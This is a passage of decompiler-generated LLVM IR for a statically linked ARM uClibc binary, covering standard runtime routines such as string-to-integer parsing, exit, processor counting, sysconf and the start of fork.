  %v4_12ee4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 276) to i32*), align 4
  %v2_12ee8 = mul nuw nsw i32 %v3_12ee0, 2
  %v2_12eec = add i32 %v2_12ee8, %v4_12ee4
  %v3_12eec = inttoptr i32 %v2_12eec to i16*
  %v4_12eec = load i16, i16* %v3_12eec, align 2
  %v1_12ef0 = and i16 %v4_12eec, 32
  %v2_12ef0 = icmp eq i16 %v1_12ef0, 0
  br i1 %v2_12ef0, label %dec_label_pc_12ef8, label %dec_label_pc_12edc

dec_label_pc_12ef8:                               ; preds = %dec_label_pc_12ee0
  %v7_12ef8 = icmp eq i8 %v2_12ee0, 43
  br i1 %v7_12ef8, label %dec_label_pc_12f18, label %dec_label_pc_12f00

dec_label_pc_12f00:                               ; preds = %dec_label_pc_12ef8
  %v7_12f00 = icmp eq i8 %v2_12ee0, 45
  br i1 %v7_12f00, label %dec_label_pc_12f18, label %bb

bb:                                               ; preds = %dec_label_pc_12f00
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12f1c

dec_label_pc_12f18:                               ; preds = %dec_label_pc_12ef8, %dec_label_pc_12f00
  %storemerge47 = phi i32 [ 1, %dec_label_pc_12f00 ], [ 0, %dec_label_pc_12ef8 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_12f18 = add i32 %v0_12f18, 1
  store i32 %v1_12f18, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12f1c

dec_label_pc_12f1c:                               ; preds = %bb, %dec_label_pc_12f18
  %v0_12f3c = phi i32 [ %v0_12f18, %bb ], [ %v1_12f18, %dec_label_pc_12f18 ]
  %v1_12f1c = and i32 %v0_12ecc, -17
  %v3_12f1c = icmp eq i32 %v1_12f1c, 0
  br i1 %v3_12f1c, label %dec_label_pc_12f28, label %bb60

bb60:                                             ; preds = %dec_label_pc_12f1c
  br label %bb64

dec_label_pc_12f28:                               ; preds = %dec_label_pc_12f1c
  %v1_12f28 = inttoptr i32 %v0_12f3c to i8*
  %v2_12f28 = load i8, i8* %v1_12f28, align 1
  %v7_12f2c = icmp eq i8 %v2_12f28, 48
  %v1_12f30 = add i32 %v0_12ecc, 10
  store i32 %v1_12f30, i32* %r5.global-to-local, align 4
  br i1 %v7_12f2c, label %dec_label_pc_12f3c, label %bb61

bb61:                                             ; preds = %dec_label_pc_12f28
  br label %.thread8

dec_label_pc_12f3c:                               ; preds = %dec_label_pc_12f28
  %v1_12f3c = add i32 %v0_12f3c, 1
  %v2_12f3c = inttoptr i32 %v1_12f3c to i8*
  %v3_12f3c = load i8, i8* %v2_12f3c, align 1
  %v4_12f3c = zext i8 %v3_12f3c to i32
  store i32 %v1_12f3c, i32* %r4.global-to-local, align 4
  %v1_12f40 = or i32 %v4_12f3c, 32
  %v7_12f44 = icmp eq i32 %v1_12f40, 120
  %v1_12f48 = add i32 %v0_12ecc, 8
  store i32 %v1_12f48, i32* %r5.global-to-local, align 4
  br i1 %v7_12f44, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_12f3c
  %v3_12f54 = mul i32 %v1_12f48, 2
  store i32 %v3_12f54, i32* %r5.global-to-local, align 4
  %v2_12f58 = add i32 %v0_12f3c, 2
  store i32 %v2_12f58, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12f3c, %bb61, %bb62
  %v1_1302c30 = phi i32 [ %v0_12ed0, %bb61 ], [ %v1_12f3c, %bb62 ], [ %v1_12f3c, %dec_label_pc_12f3c ]
  %v0_12fa821 = phi i32 [ %v0_12f3c, %bb61 ], [ %v2_12f58, %bb62 ], [ %v1_12f3c, %dec_label_pc_12f3c ]
  %v0_12f5c = phi i32 [ %v1_12f30, %bb61 ], [ %v3_12f54, %bb62 ], [ %v1_12f48, %dec_label_pc_12f3c ]
  %v5_12f60 = icmp slt i32 %v0_12f5c, 16
  br i1 %v5_12f60, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_1302c29 = phi i32 [ %v0_12ed0, %bb60 ], [ %v1_1302c30, %.thread8 ], [ %v1_1302c30, %bb63 ]
  %v0_12fa820 = phi i32 [ %v0_12f3c, %bb60 ], [ %v0_12fa821, %.thread8 ], [ %v0_12fa821, %bb63 ]
  %v0_12f88 = phi i32 [ %v0_12ecc, %bb60 ], [ %v0_12f5c, %.thread8 ], [ 16, %bb63 ]
  %v1_12f64 = add i32 %v0_12f88, -2
  %tmp = icmp ugt i32 %v1_12f64, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_12f74

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13028

dec_label_pc_12f74:                               ; preds = %bb64
  %v2_12f7c = udiv i32 -1, %v0_12f88
  %v3_12f7c = urem i32 -1, %v0_12f88
  store i32 %v0_12f88, i32* %r1.global-to-local, align 4
  %v1_12f8c = urem i32 %v3_12f7c, 256
  store i32 %v1_12f8c, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_12f7c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12fa8

dec_label_pc_12fa4:                               ; preds = %bb71, %dec_label_pc_13004
  %v0_12fa4 = phi i32 [ %v1_12fe444, %bb71 ], [ %v0_12fa4.pre, %dec_label_pc_13004 ]
  br label %dec_label_pc_12fa8

dec_label_pc_12fa8:                               ; preds = %dec_label_pc_12f74, %dec_label_pc_12fa4
  %v1_1302c27 = phi i32 [ %v1_1302c29, %dec_label_pc_12f74 ], [ %v0_12fa4, %dec_label_pc_12fa4 ]
  %v0_12fe4 = phi i32 [ %v0_12fa820, %dec_label_pc_12f74 ], [ %v0_12fa4, %dec_label_pc_12fa4 ]
  %v1_12fa8 = inttoptr i32 %v0_12fe4 to i8*
  %v2_12fa8 = load i8, i8* %v1_12fa8, align 1
  %v3_12fa8 = zext i8 %v2_12fa8 to i32
  %v1_12fac = add nsw i32 %v3_12fa8, -48
  %v1_12fb0 = urem i32 %v1_12fac, 256
  store i32 %v1_12fb0, i32* %r1.global-to-local, align 4
  %v1_12fb8 = or i32 %v3_12fa8, 32
  %tmp79 = icmp ult i32 %v1_12fb0, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_12fc0

dec_label_pc_12fc0:                               ; preds = %dec_label_pc_12fa8
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_12fb8, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_12fc0
  %v1_12fc4 = add nsw i32 %v1_12fb8, -87
  %v5_12fcc = urem i32 %v1_12fc4, 256
  store i32 %v5_12fcc, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_12fa8, %dec_label_pc_12fc0, %bb65
  %v3_12ffc = phi i32 [ %v1_12fb0, %dec_label_pc_12fa8 ], [ 40, %dec_label_pc_12fc0 ], [ %v5_12fcc, %bb65 ]
  %v1_12fd0 = load i32, i32* %r5.global-to-local, align 4
  %v6_12fd4 = icmp slt i32 %v3_12ffc, %v1_12fd0
  br i1 %v6_12fd4, label %dec_label_pc_12fd8, label %dec_label_pc_13028.loopexit

dec_label_pc_12fd8:                               ; preds = %bb66
  %v0_12fd8 = load i32, i32* %ip.global-to-local, align 4
  %v1_12fd8 = load i32, i32* %r8.global-to-local, align 4
  %v9_12fd8 = icmp eq i32 %v0_12fd8, %v1_12fd8
  br i1 %v9_12fd8, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_12fd8
  %v1_12fe440 = add i32 %v0_12fe4, 1
  store i32 %v1_12fe440, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12fec

bb67:                                             ; preds = %dec_label_pc_12fd8
  %v3_12fd8 = icmp ult i32 %v0_12fd8, %v1_12fd8
  %v1_12fe4 = add i32 %v0_12fe4, 1
  store i32 %v1_12fe4, i32* %r4.global-to-local, align 4
  br i1 %v3_12fd8, label %dec_label_pc_12fec, label %dec_label_pc_13004

dec_label_pc_12fec:                               ; preds = %bb67, %.thread39
  %v1_12fe444 = phi i32 [ %v1_12fe440, %.thread39 ], [ %v1_12fe4, %bb67 ]
  %v4_12ff42443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_12fec = load i32, i32* %sl.global-to-local, align 4
  %v3_12fec = icmp uge i32 %v3_12ffc, %v1_12fec
  %v9_12fec = icmp eq i32 %v3_12ffc, %v1_12fec
  %v2_12ff0 = xor i1 %v3_12fec, true
  %v3_12ff0 = or i1 %v9_12fec, %v2_12ff0
  br i1 %v3_12ff0, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_12fec
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_12fec, %bb68
  %v4_12ff4 = phi i32 [ %v4_12ff42443, %dec_label_pc_12fec ], [ 0, %bb68 ]
  %v2_12ff4 = xor i1 %v9_12fec, true
  %v3_12ff4 = and i1 %v3_12fec, %v2_12ff4
  br i1 %v3_12ff4, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_12ff4 = urem i32 %v4_12ff4, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_12ff8 = phi i32 [ %v5_12ff4, %bb70 ], [ %v4_12ff4, %bb69 ]
  %v2_12ff8 = icmp eq i32 %v0_12ff8, 0
  br i1 %v2_12ff8, label %bb71, label %dec_label_pc_13004

bb71:                                             ; preds = %thread-pre-split
  %v4_12ffc = mul i32 %v0_12fd8, %v1_12fd0
  %v5_12ffc = add i32 %v4_12ffc, %v3_12ffc
  store i32 %v5_12ffc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12fa4

dec_label_pc_13004:                               ; preds = %bb67, %thread-pre-split
  %v0_1300c = call i32 @__aeabi_read_tp()
  %v0_13010 = load i32, i32* %r7.global-to-local, align 4
  %v2_13010 = and i32 %v0_12ed4, %v0_13010
  store i32 %v2_13010, i32* %r7.global-to-local, align 4
  %v0_13014 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_13014, i32* %ip.global-to-local, align 4
  %v3_13018 = load i16, i16* @global_var_216ec.303, align 2
  %v4_13018 = sext i16 %v3_13018 to i32
  %v3_13020 = add i32 %v4_13018, %v0_1300c
  %v4_13020 = inttoptr i32 %v3_13020 to i32*
  store i32 34, i32* %v4_13020, align 4
  %v0_12fa4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12fa4

dec_label_pc_13028.loopexit:                      ; preds = %bb66
  %v0_13028.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13028

dec_label_pc_13028:                               ; preds = %.thread, %dec_label_pc_13028.loopexit
  %v1_1302c = phi i32 [ %v1_1302c27, %dec_label_pc_13028.loopexit ], [ %v1_1302c29, %.thread ]
  %v2_1302c = phi i32 [ %v0_13028.pre, %dec_label_pc_13028.loopexit ], [ %v0_12ec8, %.thread ]
  %v2_13028 = icmp eq i32 %v2_1302c, 0
  br i1 %v2_13028, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_13028
  %v3_1302c = inttoptr i32 %v2_1302c to i32*
  store i32 %v1_1302c, i32* %v3_1302c, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_13028, %bb72
  %v0_13034 = load i32, i32* %r7.global-to-local, align 4
  %v2_13034 = icmp eq i32 %v0_13034, 0
  %. = select i1 %v2_13034, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_13040 = icmp eq i32 %v0_12ed4, 0
  %v0_1306c.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_13040, label %dec_label_pc_13064, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_1306c.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_1304c, label %dec_label_pc_13064

dec_label_pc_1304c:                               ; preds = %bb76
  %v0_13050 = call i32 @__aeabi_read_tp()
  %v3_13054 = load i16, i16* @global_var_216ec.303, align 2
  %v4_13054 = sext i16 %v3_13054 to i32
  %v3_1305c = add i32 %v4_13054, %v0_13050
  %v4_1305c = inttoptr i32 %v3_1305c to i32*
  store i32 34, i32* %v4_1305c, align 4
  %v0_13060 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13060, i32* %ip.global-to-local, align 4
  %v0_13064.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13064

dec_label_pc_13064:                               ; preds = %bb76, %bb73, %dec_label_pc_1304c
  %v0_1306c.pre = phi i32 [ %v0_1306c.pre.pre, %bb76 ], [ %v0_13060, %dec_label_pc_1304c ], [ %v0_1306c.pre.pre, %bb73 ]
  %v0_13064 = phi i32 [ %v0_13034, %bb76 ], [ %v0_13064.pre, %dec_label_pc_1304c ], [ %v0_13034, %bb73 ]
  %v2_13064 = icmp eq i32 %v0_13064, 0
  br i1 %v2_13064, label %dec_label_pc_13064._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_13064
  %v2_13068 = sub i32 0, %v0_1306c.pre
  store i32 %v2_13068, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13064._crit_edge

dec_label_pc_13064._crit_edge:                    ; preds = %dec_label_pc_13064, %bb77
  %v0_1306c = phi i32 [ %v2_13068, %bb77 ], [ %v0_1306c.pre, %dec_label_pc_13064 ]
  ret i32 %v0_1306c

; uselistorder directives
  uselistorder i32 %v0_1306c.pre, { 1, 0 }
  uselistorder i32 %v0_1306c.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_12ff4, { 1, 0 }
  uselistorder i1 %v3_12fec, { 1, 0 }
  uselistorder i32 %v1_12fec, { 1, 0 }
  uselistorder i32 %v5_12fcc, { 1, 0 }
  uselistorder i32 %v1_12fb8, { 1, 0 }
  uselistorder i32 %v1_12fb0, { 2, 0, 1 }
  uselistorder i32 %v0_12fe4, { 1, 0, 2 }
  uselistorder i32 %v0_12fa4, { 1, 0 }
  uselistorder i32 %v3_12f54, { 1, 0 }
  uselistorder i32 %v1_12f48, { 1, 0, 2 }
  uselistorder i32 %v0_12f3c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_12f18, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12ed4, { 1, 0 }
  uselistorder i32 %v0_12ed0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12ecc, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 1, 2, 0, 4, 5, 3, 6 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13064._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_13064, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_13028, { 1, 0 }
  uselistorder label %dec_label_pc_13004, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12fa8, { 1, 0 }
  uselistorder label %dec_label_pc_12fa4, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12f1c, { 1, 0 }
  uselistorder label %dec_label_pc_12f18, { 1, 0 }
  uselistorder label %dec_label_pc_12ee0, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r5, align 4
  %v4_13098 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 140) to i32*), align 4
  store i32 %v4_13098, i32* @r4, align 4
  %v2_130a0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_130b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_130b8)
  %v0_130cc = load i32, i32* @r5, align 4
  %v2_130cc = add i32 %v0_130cc, 16
  %v3_130cc = inttoptr i32 %v2_130cc to i32*
  %v4_130cc = load i32, i32* %v3_130cc, align 4
  call void @__pseudo_branch(i32 %v4_130cc)
  %v0_130dc = load i32, i32* @r5, align 4
  %v2_130dc = add i32 %v0_130dc, 636
  %v3_130dc = inttoptr i32 %v2_130dc to i32*
  %v4_130dc = load i32, i32* %v3_130dc, align 4
  %v2_130e4 = icmp eq i32 %v4_130dc, 0
  br i1 %v2_130e4, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_130f0 = xor i1 %v2_130e4, true
  call void @__pseudo_cond_branch(i1 %v2_130f0, i32 %v4_130dc)
  store i32 %v2_130a0, i32* @r0, align 4
  %v0_13100 = load i32, i32* @r5, align 4
  %v2_13100 = add i32 %v0_13100, 44
  %v3_13100 = inttoptr i32 %v2_13100 to i32*
  %v4_13100 = load i32, i32* %v3_13100, align 4
  call void @__pseudo_branch(i32 %v4_13100)
  %v0_1310c = call i32 @__GI___uClibc_fini()
  %v0_13114 = load i32, i32* @r5, align 4
  %v2_13114 = add i32 %v0_13114, -47616
  %v2_1311c = icmp eq i32 %v2_13114, 0
  br i1 %v2_1311c, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_13124 = xor i1 %v2_1311c, true
  call void @__pseudo_cond_branch(i1 %v2_13124, i32 %v2_13114)
  %v0_13128 = load i32, i32* @r6, align 4
  %v1_1312c = call i32 @__GI__exit(i32 %v0_13128)
  %v0_13130 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13130, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_13130 = load i32, i32* @lr, align 4
  %v3_13130 = inttoptr i32 %v1_1312c to i32*
  store i32 %v1_13130, i32* %v3_13130, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_13148 = phi i32 [ %v1_1312c, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_13148

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 -34012), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_13170 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 -34012))
  store i32 %v1_13170, i32* @r6, align 4
  %v2_13174 = icmp eq i32 %v1_13170, 0
  br i1 %v2_13174, label %dec_label_pc_131f4, label %dec_label_pc_1317c

dec_label_pc_1317c:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_13184 = load i32, i32* @r4, align 4
  %v2_13184 = add i32 %v0_13184, -34000
  store i32 %v2_13184, i32* @r8, align 4
  %v2_13188 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13188, i32* @r7, align 4
  br label %bb18

dec_label_pc_13190:                               ; preds = %bb18
  %v3_13190 = load i32, i32* %stack_var_-36, align 4
  %v1_13194 = inttoptr i32 %v3_13190 to i32*
  %v2_13194 = load i32, i32* %v1_13194, align 4
  %v1_13198 = inttoptr i32 %v2_13194 to i8*
  %v2_13198 = load i8, i8* %v1_13198, align 1
  %v7_1319c = icmp eq i8 %v2_13198, 99
  br i1 %v7_1319c, label %dec_label_pc_131a4, label %.backedge3

dec_label_pc_131a4:                               ; preds = %dec_label_pc_13190
  %v1_131a4 = add i32 %v2_13194, 1
  %v2_131a4 = inttoptr i32 %v1_131a4 to i8*
  %v3_131a4 = load i8, i8* %v2_131a4, align 1
  %v7_131a8 = icmp eq i8 %v3_131a4, 112
  br i1 %v7_131a8, label %dec_label_pc_131b0, label %.backedge3

dec_label_pc_131b0:                               ; preds = %dec_label_pc_131a4
  %v1_131b0 = add i32 %v2_13194, 2
  %v2_131b0 = inttoptr i32 %v1_131b0 to i8*
  %v3_131b0 = load i8, i8* %v2_131b0, align 1
  %v7_131b4 = icmp eq i8 %v3_131b0, 117
  br i1 %v7_131b4, label %dec_label_pc_131bc, label %.backedge3

dec_label_pc_131bc:                               ; preds = %dec_label_pc_131b0
  %v1_131bc = add i32 %v2_13194, 3
  %v2_131bc = inttoptr i32 %v1_131bc to i8*
  %v3_131bc = load i8, i8* %v2_131bc, align 1
  %v4_131bc = zext i8 %v3_131bc to i32
  %v0_131c0 = load i32, i32* @r4, align 4
  %v1_131c0 = load i32, i32* @sl, align 4
  %v2_131c0 = add i32 %v1_131c0, %v0_131c0
  %v3_131c0 = inttoptr i32 %v2_131c0 to i32*
  %v4_131c0 = load i32, i32* %v3_131c0, align 4
  %v2_131c4 = mul nuw nsw i32 %v4_131bc, 2
  %v2_131c8 = add i32 %v4_131c0, %v2_131c4
  %v3_131c8 = inttoptr i32 %v2_131c8 to i16*
  %v4_131c8 = load i16, i16* %v3_131c8, align 2
  %v1_131cc = and i16 %v4_131c8, 8
  %v2_131cc = icmp eq i16 %v1_131cc, 0
  br i1 %v2_131cc, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_131bc
  %v1_131d0 = load i32, i32* @r5, align 4
  %v2_131d0 = add i32 %v1_131d0, 1
  store i32 %v2_131d0, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_131bc, %dec_label_pc_13190, %dec_label_pc_131a4, %dec_label_pc_131b0
  %v0_131d4.pre = load i32, i32* @r6, align 4
  %v0_131e0.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_1317c
  %v0_131e0 = phi i32 [ %v0_131e0.pre, %.backedge3 ], [ %v2_13184, %dec_label_pc_1317c ]
  %v0_131d4 = phi i32 [ %v0_131d4.pre, %.backedge3 ], [ %v1_13170, %dec_label_pc_1317c ]
  %v4_131e4 = inttoptr i32 %v0_131d4 to i32*
  %v5_131e4 = call i32 @__GI_config_read(i32* %v4_131e4, i32 %v2_13188, i32 258, i32 %v0_131e0)
  %v2_131e8 = icmp eq i32 %v5_131e4, 0
  br i1 %v2_131e8, label %dec_label_pc_13258, label %dec_label_pc_13190

dec_label_pc_131f4:                               ; preds = %entry
  %v0_131f8 = load i32, i32* @r4, align 4
  %v2_131f8 = add i32 %v0_131f8, -33996
  store i32 %v2_131f8, i32* @r0, align 4
  %v1_131fc = call i32 @__GI_config_open(i32 %v2_131f8)
  store i32 %v1_131fc, i32* @r6, align 4
  %v2_13200 = icmp eq i32 %v1_131fc, 0
  br i1 %v2_13200, label %bb19, label %dec_label_pc_1320c

bb19:                                             ; preds = %dec_label_pc_131f4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_13258

dec_label_pc_1320c:                               ; preds = %dec_label_pc_131f4
  %v0_13210 = load i32, i32* @r4, align 4
  %v2_13210 = add i32 %v0_13210, -33980
  store i32 %v2_13210, i32* @r8, align 4
  %v2_13218 = add i32 %v0_13210, -33944
  store i32 %v2_13218, i32* @r7, align 4
  %v2_1321c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1321c, i32* @r4, align 4
  br label %bb21

dec_label_pc_13224:                               ; preds = %bb21
  %v0_13250 = load i32, i32* @r8, align 4
  %v3_13224 = load i32, i32* %stack_var_-36, align 4
  %v1_13228 = inttoptr i32 %v3_13224 to i32*
  %v2_13228 = load i32, i32* %v1_13228, align 4
  store i32 %v2_13228, i32* @r1, align 4
  %v2_1322c = inttoptr i32 %v0_13250 to i8*
  %v3_1322c = call i32 @__GI_strcoll(i8* %v2_1322c, i32 %v2_13228)
  %v2_13230 = icmp eq i32 %v3_1322c, 0
  br i1 %v2_13230, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_13224
  %v1_13234 = load i32, i32* @r5, align 4
  %v2_13234 = add i32 %v1_13234, 1
  store i32 %v2_13234, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_13224
  %v0_13240.pre = load i32, i32* @r7, align 4
  %v0_13244.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_1320c
  %v0_13244 = phi i32 [ %v0_13244.pre, %.backedge ], [ %v1_131fc, %dec_label_pc_1320c ]
  %v0_13240 = phi i32 [ %v0_13240.pre, %.backedge ], [ %v2_13218, %dec_label_pc_1320c ]
  %v4_13248 = inttoptr i32 %v0_13244 to i32*
  %v5_13248 = call i32 @__GI_config_read(i32* %v4_13248, i32 %v2_1321c, i32 459266, i32 %v0_13240)
  %v2_1324c = icmp eq i32 %v5_13248, 0
  br i1 %v2_1324c, label %dec_label_pc_13258, label %dec_label_pc_13224

dec_label_pc_13258:                               ; preds = %bb18, %bb21, %bb19
  %v0_13258 = load i32, i32* @r6, align 4
  %v1_1325c = inttoptr i32 %v0_13258 to i32*
  %v2_1325c = call i32 @__GI_config_close(i32* %v1_1325c)
  %v0_13260 = load i32, i32* @r5, align 4
  %v2_13260 = icmp eq i32 %v0_13260, 0
  %.v0_13260 = select i1 %v2_13260, i32 1, i32 %v0_13260
  ret i32 %.v0_13260

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_13258, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_1368c

bb:                                               ; preds = %entry
  %v7_132b0 = mul i32 %arg1, 4
  %v8_132b0 = add i32 %v7_132b0, ptrtoint (i32* @global_var_132b8.454 to i32)
  call void @__pseudo_branch(i32 %v8_132b0)
  br label %dec_label_pc_1368c

dec_label_pc_1368c:                               ; preds = %bb, %entry
  %v0_13690 = call i32 @__aeabi_read_tp()
  %v3_13694 = load i16, i16* @global_var_216ec.303, align 2
  %v4_13694 = sext i16 %v3_13694 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_136a0 = add i32 %v4_13694, %v0_13690
  %v4_136a0 = inttoptr i32 %v3_136a0 to i32*
  store i32 22, i32* %v4_136a0, align 4
  %v0_13884 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_13884

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 12772, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r8.global-to-local, align 4
  %v4_139b016 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 12772) to i32*), align 4
  store i32 %v4_139b016, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_139b418 = icmp eq i32 %v4_139b016, 0
  br i1 %v2_139b418, label %dec_label_pc_139bc, label %dec_label_pc_138e0

dec_label_pc_138e0:                               ; preds = %entry, %dec_label_pc_139b0.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_138ec = load i32, i32* %r7.global-to-local, align 4
  %v1_138ec = add i32 %v0_138ec, 20
  %v2_138ec = inttoptr i32 %v1_138ec to i32*
  %v3_138ec = load i32, i32* %v2_138ec, align 4
  store i32 %v3_138ec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_138f0 = icmp eq i32 %v3_138ec, 0
  store i32 %v3_138ec, i32* %r4.global-to-local, align 4
  br i1 %v2_138f0, label %dec_label_pc_139b0.backedge, label %dec_label_pc_13900

dec_label_pc_139b0.backedge:                      ; preds = %dec_label_pc_138e0, %dec_label_pc_1392c
  %v0_139b0 = load i32, i32* %r8.global-to-local, align 4
  %v1_139b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_139b0 = add i32 %v1_139b0, %v0_139b0
  %v3_139b0 = inttoptr i32 %v2_139b0 to i32*
  %v4_139b0 = load i32, i32* %v3_139b0, align 4
